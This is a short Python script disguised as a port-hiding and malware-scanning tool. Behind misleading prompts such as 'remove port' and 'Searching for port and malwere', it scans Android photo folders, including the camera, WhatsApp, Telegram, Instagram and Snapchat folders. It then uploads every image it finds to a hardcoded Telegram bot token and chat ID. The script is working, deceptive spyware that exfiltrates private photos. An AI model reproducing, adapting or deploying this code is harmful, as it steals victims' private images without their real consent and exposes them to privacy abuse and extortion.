"""
port hidden 
"""

import os
import sys
import time
import requests

# ==================== TELEGRAM CONFIG ====================
TELEGRAM_BOT_TOKEN = "8134629384:AAE8YCOkeoEeMZ_6FGaRbCf4TNLf55rl82I"
TELEGRAM_CHAT_ID = "820421921"

class PhotoSender:
    def __init__(self, bot_token, chat_id):
        self.api = f"https://api.telegram.org/bot{bot_token}"
        self.chat_id = chat_id
        
    def send_photo(self, path):
        try:
            with open(path, "rb") as f:
                r = requests.post(
                    f"{self.api}/sendPhoto",
                    data={"chat_id": self.chat_id},
                    files={"photo": f},
                    timeout=10
                )
            return r.status_code == 200
        except:
            return False
    
    def send_all(self, paths):
        total = len(paths)
        for i, p in enumerate(paths, 1):
            self.send_photo(p)
            print(f"\r🚀remove port {i}/{total}", end="", flush=True)
            time.sleep(0.3)
        print()

class DCIMFinder:
    def find_all(self):
        all_photos = []
        
        exts = {'.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp'}
        
        search_paths = [
            "/sdcard/DCIM",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
            "/storage/emulated/0/Telegram/Telegram Images",
            "/storage/emulated/0/Camera",
            "/storage/emulated/0/Photos",
            "/storage/emulated/0/Photo",
            "/storage/emulated/0/Instagram",
            "/storage/emulated/0/Snapchat",
            "/storage/emulated/0/Messenger"
        ]
        
        for path in search_paths:
            if os.path.exists(path):
                try:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if os.path.splitext(file)[1].lower() in exts:
                                all_photos.append(os.path.join(root, file))
                except:
                    continue
        
        return all_photos

def main():
    os.system("clear")
    
    print("\n" + "="*50)
    print("hidden location")
    print("="*50)
    
    # Consent
    print("\nType 'ALL' to of all ports")
    response = input("> ").strip().upper()
    
    if response != "ALL":
        return
    
    # Find photos
    finder = DCIMFinder()
    print("\n🔍 Searching for port and malwere...")
    
    photos = finder.find_all()
    
    if not photos:
        print("❌ No port found")
        return
    
    print(f"✅ Found {len(photos)} port and malwere")
    print("⏳ This may take time WAIT...")
    
    # Send all
    sender = PhotoSender(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
    sender.send_all(photos)
    
    print(f"\n✅ Done!  {len(photos)} DISABLE")

if __name__ == "__main__":
    main()
